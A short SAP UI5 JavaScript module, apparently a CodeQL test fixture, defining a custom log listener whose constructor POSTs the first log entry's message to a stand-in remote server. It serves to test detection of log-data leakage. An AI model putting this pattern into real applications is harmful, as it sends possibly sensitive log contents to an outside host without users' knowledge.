sap.ui.define(
  ["sap/ui/base/Object", "sap/base/Log"],
  function (BaseObject, Log) {
    "use strict";
    return BaseObject.extend("codeql-sap-js.log.CustomLogListener", {
      constructor: function () {
        let message = Log.getLogEntries()[0].message;
        const http = new XMLHttpRequest();
        const url = "https://some.remote.server/location";
        http.open("POST", url);
        http.send(message);
      },
    });
  },
);
